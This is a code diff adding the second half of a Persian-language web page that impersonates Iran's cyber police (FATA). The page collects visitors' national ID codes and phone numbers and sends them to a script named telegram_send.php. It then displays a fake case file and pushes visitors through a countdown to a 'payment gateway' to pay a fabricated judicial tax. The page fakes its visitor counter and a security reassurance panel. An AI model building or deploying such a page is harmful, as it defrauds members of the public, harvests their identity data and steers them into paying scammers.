+                                <p class="mb-0 text-danger">[نیازمند پرداخت برای مشاهده ادامه]</p>
+                            </div>
+                        </div>
+                        
+                        <div class="security-tips mt-5">
+                            <h6><i class="fas fa-exclamation-circle me-2"></i> نکات مهم:</h6>
+                            <ul class="mb-0" style="font-size: 13px;">
+                                <li>پرونده شما نزد پلیس فتا محرمانه است. از افشای اطلاعات آن خودداری کنید.</li>
+                                <li>برای مشاهده کامل پرونده نیاز به پرداخت مالیات خدمات قضایی می‌باشد.</li>
+                                <li>پرداخت این مبلغ تنها از طریق درگاه‌های امن بانکی صورت می‌گیرد.</li>
+                                <li>اطلاعات پرداختی شما به صورت امن به سیستم مرکزی ارسال می‌شود.</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="text-center mt-4">
+                            <a href="#" class="btn-back" id="backToForm">
+                                <i class="fas fa-arrow-right me-2"></i>
+                                بازگشت به صفحه اصلی
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="paymentPage" class="payment-page">
+        <div class="container">
+            <div class="form-wrapper">
+                <div class="form-header">
+                    <h2 class="mb-3">
+                        <i class="fas fa-credit-card me-3"></i>
+                        درگاه پرداخت امن
+                    </h2>
+                    <p class="mb-0" style="opacity: 0.9; font-size: 13px;">
+                        پرداخت مالیات خدمات قضایی - پلیس فتا
+                    </p>
+                </div>
+                
+                <div class="form-section">
+                    <div class="payment-status">
+                        <div class="payment-status-icon">
+                            <i class="fas fa-shield-check"></i>
+                        </div>
+                        
+                        <h3 class="text-success mb-3">
+                            <i class="fas fa-check-circle me-2"></i>
+                            درگاه پرداخت آماده است
+                        </h3>
+                        
+                        <p class="lead" style="font-size: 15px;">
+                            برای تکمیل پرداخت مبلغ <strong>۱۰,۰۰۰ تومان</strong>، لطفاً روی دکمه زیر کلیک کنید.
+                        </p>
+                        
+                        <p class="text-muted" style="font-size: 13px;">
+                            شما به درگاه پرداخت امن بانکی هدایت خواهید شد.
+                        </p>
+                        
+                        <button type="button" class="payment-redirect-btn" id="goToPaymentGateway">
+                            <i class="fas fa-external-link-alt me-2"></i>
+                            هدایت به درگاه پرداخت
+                        </button>
+                        
+                        <div class="payment-note mt-4">
+                            <i class="fas fa-info-circle me-2 text-primary"></i>
+                            پس از تکمیل پرداخت، به صورت خودکار به صفحه نتایج کامل پرونده هدایت خواهید شد.
+                        </div>
+                    </div>
+                    
+                    <div class="result-panel mt-4">
+                        <h5 class="mb-3">
+                            <i class="fas fa-receipt me-2"></i>
+                            اطلاعات تراکنش
+                        </h5>
+                        <div class="row">
+                            <div class="col-md-6">
+                                <p><strong>شماره پرونده:</strong> <span id="payCaseNumber">CPTS-FTA-۱۴۰۲-۳۸۴۷</span></p>
+                                <p><strong>مبلغ قابل پرداخت:</strong> <span class="text-danger fw-bold">۱۰,۰۰۰ تومان</span></p>
+                                <p><strong>شرح خدمات:</strong> مالیات خدمات قضایی</p>
+                            </div>
+                            <div class="col-md-6">
+                                <p><strong>کد رهگیری:</strong> <span class="font-monospace" id="trackingCode">FTA-00000000</span></p>
+                                <p><strong>تاریخ انقضا:</strong> ۱۴۰۲/۰۷/۳۰ - ۲۳:۵۹</p>
+                                <p><strong>وضعیت:</strong> <span class="badge bg-warning">در انتظار پرداخت</span></p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="text-center mt-4">
+                        <button type="button" class="btn-back" id="backToResult">
+                            <i class="fas fa-arrow-right me-2"></i>
+                            بازگشت به نتایج
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="countdownOverlay" class="countdown-overlay">
+        <div class="countdown-number" id="countdownNumber">5</div>
+        <div class="countdown-message">در حال انتقال به درگاه پرداخت امن</div>
+        <div class="countdown-submessage">لطفاً منتظر بمانید...</div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // تنظیم تاریخ و ساعت جاری
+        function updateDateTime() {
+            const now = new Date();
+            const options = { 
+                year: 'numeric', 
+                month: 'long', 
+                day: 'numeric',
+                weekday: 'long'
+            };
+            const dateStr = now.toLocaleDateString('fa-IR', options);
+            const timeStr = now.toLocaleTimeString('fa-IR');
+            
+            document.getElementById('current-date').textContent = 
+                `${dateStr} - ${timeStr}`;
+        }
+        
+        // تولید کد کپچا
+        function generateCaptcha() {
+            const chars = '۰۱۲۳۴۵۶۷۸۹ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz';
+            let captcha = '';
+            for (let i = 0; i < 6; i++) {
+                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            document.getElementById('captchaText').textContent = captcha;
+            return captcha;
+        }
+        
+        // اعتبارسنجی کد ملی
+        function validateNationalCode(code) {
+            if (!/^\d{10}$/.test(code)) return false;
+            
+            let sum = 0;
+            for (let i = 0; i < 9; i++) {
+                sum += parseInt(code.charAt(i)) * (10 - i);
+            }
+            let remainder = sum % 11;
+            let checkDigit = parseInt(code.charAt(9));
+            
+            if (remainder < 2) {
+                return checkDigit === remainder;
+            } else {
+                return checkDigit === (11 - remainder);
+            }
+        }
+        
+        // اعتبارسنجی شماره تماس
+        function validatePhoneNumber(phone) {
+            return /^09\d{9}$/.test(phone);
+        }
+        
+        // نمایش خطا
+        function showError(message) {
+            const errorDiv = document.getElementById('formError');
+            const errorText = document.getElementById('errorText');
+            errorText.textContent = message;
+            errorDiv.style.display = 'block';
+            
+            setTimeout(() => {
+                errorDiv.style.display = 'none';
+            }, 5000);
+        }
+        
+        // نمایش موفقیت
+        function showSuccess(message) {
+            const successDiv = document.getElementById('successMessage');
+            const successText = document.getElementById('successText');
+            successText.textContent = message;
+            successDiv.style.display = 'block';
+            
+            setTimeout(() => {
+                successDiv.style.display = 'none';
+            }, 5000);
+        }
+        
+        // ارسال اطلاعات به PHP Backend
+        async function sendToTelegramBackend(formData) {
+            try {
+                const data = new FormData();
+                data.append('nationalCode', formData.nationalCode);
+                data.append('phone', formData.phoneNumber);
+                
+                const response = await fetch('telegram_send.php', {
+                    method: 'POST',
+                    body: data
+                });
+                
+                const result = await response.json();
+                return result;
+                
+            } catch (error) {
+                console.error('خطا در ارسال به PHP:', error);
+                return {
+                    success: false,
+                    message: 'خطا در ارتباط با سرور'
+                };
+            }
+        }
+        
+        // نمایش صفحه نتایج
+        function showResultPage(telegramResult, formData) {
+            document.getElementById('mainPage').style.display = 'none';
+            document.getElementById('resultPage').style.display = 'block';
+            
+            document.getElementById('resNationalCode').textContent = formData.nationalCode;
+            document.getElementById('resPhoneNumber').textContent = formData.phoneNumber;
+            document.getElementById('resCaseNumber').textContent = formData.caseNumber;
+            
+            const telegramDetails = document.getElementById('telegramDetails');
+            const telegramTitle = document.getElementById('telegramTitle');
+            const telegramSuccessDiv = document.getElementById('telegramSuccess');
+            
+            if (telegramResult.success) {
+                telegramTitle.textContent = 'اطلاعات پرونده با موفقیت به تلگرام ارسال شد!';
+                telegramDetails.textContent = telegramResult.message;
+                telegramSuccessDiv.style.display = 'block';
+                telegramSuccessDiv.style.backgroundColor = 'rgba(0, 136, 204, 0.1)';
+                telegramSuccessDiv.style.borderRight = '4px solid #0088cc';
+            } else {
+                telegramTitle.textContent = 'خطا در ارسال اطلاعات!';
+                telegramDetails.textContent = telegramResult.message;
+                telegramSuccessDiv.style.display = 'block';
+                telegramSuccessDiv.style.backgroundColor = 'rgba(211, 47, 47, 0.1)';
+                telegramSuccessDiv.style.borderRight = '4px solid var(--cyber-red)';
+            }
+            
+            window.scrollTo(0, 0);
+        }
+        
+        // نمایش صفحه پرداخت
+        function showPaymentPage() {
+            document.getElementById('resultPage').style.display = 'none';
+            document.getElementById('paymentPage').style.display = 'block';
+            
+            // تولید کد رهگیری
+            const trackingCode = 'FTA-' + Date.now().toString().slice(-8);
+            document.getElementById('trackingCode').textContent = trackingCode;
+            
+            window.scrollTo(0, 0);
+        }
+        
+        // شمارش معکوس برای انتقال به درگاه پرداخت
+        function startCountdown() {
+            const countdownOverlay = document.getElementById('countdownOverlay');
+            const countdownNumber = document.getElementById('countdownNumber');
+            
+            countdownOverlay.style.display = 'flex';
+            
+            let count = 5;
+            
+            const countdownInterval = setInterval(() => {
+                countdownNumber.textContent = count;
+                count--;
+                
+                if (count < 0) {
+                    clearInterval(countdownInterval);
+                    
+                    setTimeout(() => {
+                        // آدرس درگاه پرداخت واقعی شما
+                        window.location.href = "pay/index.php";
+                    }, 500);
+                }
+            }, 1000);
+        }
+        
+        // بازگشت به فرم
+        function setupBackButtons() {
+            document.getElementById('backToForm').addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                document.getElementById('mainPage').style.display = 'block';
+                document.getElementById('resultPage').style.display = 'none';
+                document.getElementById('paymentPage').style.display = 'none';
+                document.getElementById('countdownOverlay').style.display = 'none';
+                
+                document.getElementById('cyberForm').reset();
+                currentCaptcha = generateCaptcha();
+                
+                window.scrollTo(0, 0);
+            });
+            
+            document.getElementById('backToResult').addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                document.getElementById('resultPage').style.display = 'block';
+                document.getElementById('paymentPage').style.display = 'none';
+                document.getElementById('countdownOverlay').style.display = 'none';
+                
+                window.scrollTo(0, 0);
+            });
+        }
+        
+        // مقداردهی اولیه
+        let currentCaptcha = generateCaptcha();
+        let currentFormData = null;
+        updateDateTime();
+        setInterval(updateDateTime, 60000);
+        setupBackButtons();
+        
+        // شبیه‌سازی تعداد بازدیدکنندگان
+        document.getElementById('visitorCount').textContent = 
+            (Math.floor(Math.random() * 500) + 800).toLocaleString('fa-IR');
+        
+        // رفرش کپچا
+        document.getElementById('refreshCaptcha').addEventListener('click', function() {
+            currentCaptcha = generateCaptcha();
+            this.innerHTML = '<i class="fas fa-sync-alt me-2"></i> کد جدید';
+        });
+        
+        // شبیه‌سازی کپچای صوتی
+        document.getElementById('audioCaptcha').addEventListener('click', function() {
+            if ('speechSynthesis' in window) {
+                const audioMsg = new SpeechSynthesisUtterance(`کد امنیتی: ${currentCaptcha.split('').join(' ')}`);
+                audioMsg.lang = 'fa-IR';
+                audioMsg.rate = 0.8;
+                audioMsg.pitch = 1;
+                window.speechSynthesis.speak(audioMsg);
+                
+                const originalHTML = this.innerHTML;
+                this.innerHTML = '<i class="fas fa-volume-up me-2"></i> در حال پخش...';
+                setTimeout(() => {
+                    this.innerHTML = originalHTML;
+                }, 2000);
+            } else {
+                showError('مرورگر شما از قابلیت خواندن متن پشتیبانی نمی‌کند.');
+            }
+        });
+        
+        // ارسال فرم
+        document.getElementById('cyberForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            document.getElementById('formError').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'none';
+            
+            const nationalCode = document.getElementById('nationalCode').value.trim();
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            const caseNumber = document.getElementById('caseNumber').value.trim();
+            const captchaInput = document.getElementById('captchaInput').value.trim();
+            
+            let isValid = true;
+            let errorMessage = '';
+            
+            if (!nationalCode) {
+                errorMessage = 'کد ملی الزامی است.';
+                isValid = false;
+            } else if (!validateNationalCode(nationalCode)) {
+                errorMessage = 'کد ملی وارد شده معتبر نمی‌باشد.';
+                isValid = false;
+            }
+            
+            if (!phoneNumber) {
+                errorMessage = 'شماره تماس الزامی است.';
+                isValid = false;
+            } else if (!validatePhoneNumber(phoneNumber)) {
+                errorMessage = 'شماره تماس باید ۱۱ رقمی و با ۰۹ شروع شود.';
+                isValid = false;
+            }
+            
+            if (!caseNumber) {
+                errorMessage = 'شماره پرونده الزامی است.';
+                isValid = false;
+            } else if (caseNumber.length < 5) {
+                errorMessage = 'شماره پرونده باید حداقل ۵ کاراکتر باشد.';
+                isValid = false;
+            }
+            
+            if (!captchaInput) {
+                errorMessage = 'کد امنیتی الزامی است.';
+                isValid = false;
+            } else if (captchaInput !== currentCaptcha) {
+                errorMessage = 'کد امنیتی وارد شده صحیح نمی‌باشد.';
+                isValid = false;
+            }
+            
+            if (!isValid) {
+                showError(errorMessage);
+                if (errorMessage.includes('کد ملی')) {
+                    document.getElementById('nationalCode').classList.add('error');
+                }
+                if (errorMessage.includes('شماره تماس')) {
+                    document.getElementById('phoneNumber').classList.add('error');
+                }
+                if (errorMessage.includes('کد امنیتی')) {
+                    document.getElementById('captchaInput').classList.add('error');
+                    currentCaptcha = generateCaptcha();
+                }
+                return;
+            }
+            
+            document.getElementById('nationalCode').classList.remove('error');
+            document.getElementById('phoneNumber').classList.remove('error');
+            document.getElementById('captchaInput').classList.remove('error');
+            
+            document.getElementById('loadingContainer').style.display = 'block';
+            document.getElementById('submitBtn').classList.add('loading');
+            document.getElementById('submitBtn').disabled = true;
+            
+            currentFormData = {
+                nationalCode,
+                phoneNumber,
+                caseNumber,
+                timestamp: new Date().toISOString()
+            };
+            
+            try {
+                console.log('در حال ارسال اطلاعات به سرور PHP...');
+                const telegramResult = await sendToTelegramBackend(currentFormData);
+                console.log('نتایج ارسال به PHP:', telegramResult);
+                
+                setTimeout(() => {
+                    document.getElementById('loadingContainer').style.display = 'none';
+                    document.getElementById('submitBtn').classList.remove('loading');
+                    document.getElementById('submitBtn').disabled = false;
+                    
+                    showResultPage(telegramResult, currentFormData);
+                    
+                }, 1500);
+                
+            } catch (error) {
+                console.error('خطا در پردازش:', error);
+                document.getElementById('loadingContainer').style.display = 'none';
+                document.getElementById('submitBtn').classList.remove('loading');
+                document.getElementById('submitBtn').disabled = false;
+                showError('خطایی در پردازش درخواست رخ داده است.');
+            }
+        });
+        
+        // رویدادهای دکمه پرداخت
+        document.addEventListener('DOMContentLoaded', function() {
+            const paymentButton = document.getElementById('paymentButton');
+            if (paymentButton) {
+                paymentButton.addEventListener('click', function() {
+                    showPaymentPage();
+                });
+            }
+            
+            const goToPaymentGateway = document.getElementById('goToPaymentGateway');
+            if (goToPaymentGateway) {
+                goToPaymentGateway.addEventListener('click', function() {
+                    startCountdown();
+                });
+            }
+        });
+        
+        // اعتبارسنجی لحظه‌ای کد ملی
+        document.getElementById('nationalCode').addEventListener('blur', function() {
+            const value = this.value.trim();
+            if (value && !validateNationalCode(value)) {
+                this.classList.add('error');
+                showError('کد ملی وارد شده معتبر نمی‌باشد.');
+            } else {
+                this.classList.remove('error');
+            }
+        });
+        
+        // اعتبارسنجی لحظه‌ای شماره تماس
+        document.getElementById('phoneNumber').addEventListener('blur', function() {
+            const value = this.value.trim();
+            if (value && !validatePhoneNumber(value)) {
+                this.classList.add('error');
+                showError('شماره تماس باید ۱۱ رقمی و با ۰۹ شروع شود.');
+            } else {
+                this.classList.remove('error');
+            }
+        });
+        
+        // محدود کردن کد ملی به عدد
+        document.getElementById('nationalCode').addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '');
+            if (this.value.length > 10) {
+                this.value = this.value.slice(0, 10);
+            }
+        });
+        
+        // محدود کردن شماره تماس به عدد
+        document.getElementById('phoneNumber').addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '');
+            if (this.value.length > 11) {
+                this.value = this.value.slice(0, 11);
+            }
+            
+            if (this.value.length >= 2 && !this.value.startsWith('09')) {
+                this.classList.add('error');
+            } else {
+                this.classList.remove('error');
+            }
+        });
+        
+        // پاک کردن خطا هنگام تایپ
+        document.querySelectorAll('.form-input').forEach(input => {
+            input.addEventListener('input', function() {
+                this.classList.remove('error');
+                document.getElementById('formError').style.display = 'none';
+            });
+        });
+        
+        // جلوگیری از ارسال فرم با Enter در فیلدها
+        document.querySelectorAll('.form-input').forEach(input => {
+            input.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
